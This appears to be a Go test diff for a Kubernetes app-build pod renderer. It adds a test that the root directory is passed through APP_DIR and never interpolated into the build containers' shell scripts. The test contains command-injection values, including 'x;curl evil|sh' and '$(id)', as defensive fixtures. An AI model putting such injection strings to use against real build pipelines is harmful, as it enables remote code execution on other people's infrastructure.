@@ -14,7 +14,7 @@ import (
 
 func testAppBuildOptions() AppBuildOptions {
 	return AppBuildOptions{
-		Namespace: "app-builds", RuntimeClass: "gvisor", PriorityClass: "build-low", Slots: 1,
+		Namespace: "app-builds", SiteBuildNamespace: "site-builds", RuntimeClass: "gvisor", PriorityClass: "build-low", Slots: 1,
 		PrepareImage: "busybox:1.37.0", ToolImage: "node:22-bookworm", BuildKitImage: "moby/buildkit:v0.34.0-rootless",
 		BuilderImage: "paketobuildpacks/ubuntu-noble-builder:0.0.203", RunImage: "docker.io/paketobuildpacks/ubuntu-noble-run:0.0.150@sha256:feed",
 		CraneImage: "gcr.io/go-containerregistry/crane:v0.20.6",
@@ -157,7 +157,7 @@ func TestAppBuildPod_BuildpacksKeepTheAppsCodeInItsOwnStep(t *testing.T) {
 	}
 	expectAll(t, map[string]bool{
 		"analyze alone, before detection":          strings.Contains(scripts["analyze"], "/cnb/lifecycle/analyzer -layers=/work/layers -run-image=docker.io/paketobuildpacks/ubuntu-noble-run:0.0.150 -layout") && !strings.Contains(scripts["analyze"], "restorer"),
-		"detect, restore, then build the root dir": strings.Contains(scripts["buildpacks"], "/cnb/lifecycle/detector -layers=/work/layers -app=/work/src/api -platform=/run/platform") && strings.Contains(scripts["buildpacks"], "&& /cnb/lifecycle/restorer -layers=/work/layers -layout") && strings.Contains(scripts["buildpacks"], "&& /cnb/lifecycle/builder"),
+		"detect, restore, then build the root dir": strings.Contains(scripts["buildpacks"], `/cnb/lifecycle/detector -layers=/work/layers -app="$APP_DIR" -platform=/run/platform`) && strings.Contains(scripts["buildpacks"], "&& /cnb/lifecycle/restorer -layers=/work/layers -layout") && strings.Contains(scripts["buildpacks"], "&& /cnb/lifecycle/builder"),
 		"export to the layout":                     strings.Contains(scripts["export"], "/cnb/lifecycle/exporter") && strings.Contains(scripts["export"], "-layout -layout-dir=/work/out/layout "+appBuildImageRef),
 		"builder image":                            containerNamed(t, pod.InitContainers, "export").Image == "paketobuildpacks/ubuntu-noble-builder:0.0.203",
 	})
@@ -170,6 +170,38 @@ func TestAppBuildPod_BuildpacksKeepTheAppsCodeInItsOwnStep(t *testing.T) {
 			t.Errorf("build-visible secrets go to the platform env dir: %s", mount.MountPath)
 		}
 	}
+}
+
+// A root directory is never pasted into a script: the steps read it from APP_DIR or
+// take it as an argument, so a name that slipped past Validate cannot run a command.
+func TestAppBuildPod_ScriptsNeverCarryTheRootDirectory(t *testing.T) {
+	const hostile = "x;curl evil|sh"
+	for _, builder := range []appbuilds.Builder{appbuilds.BuilderDockerfile, appbuilds.BuilderBuildpacks} {
+		spec := testAppRunSpec(builder)
+		spec.RootDir, spec.DockerfilePath = hostile, "$(id)/Dockerfile"
+		pod := renderAppBuildJob(testAppBuildOptions(), spec).Spec.Template.Spec
+		for _, container := range append(pod.InitContainers, pod.Containers...) {
+			script := shellScript(container)
+			if strings.Contains(script, hostile) || strings.Contains(script, "$(id)") {
+				t.Errorf("%s/%s: the script carries the spec's path: %q", builder, container.Name, script)
+			}
+			for _, env := range container.Env {
+				if env.Name == "APP_DIR" && env.Value != spec.ContextDir() {
+					t.Errorf("%s/%s: APP_DIR %q, want %q", builder, container.Name, env.Value, spec.ContextDir())
+				}
+			}
+		}
+	}
+}
+
+// shellScript is the inline script a container hands to sh -c or bash -c, if any.
+func shellScript(container corev1.Container) string {
+	for i := 0; i+1 < len(container.Command); i++ {
+		if container.Command[i] == "-c" {
+			return container.Command[i+1]
+		}
+	}
+	return ""
 }
 
 func TestLayoutPath(t *testing.T) {
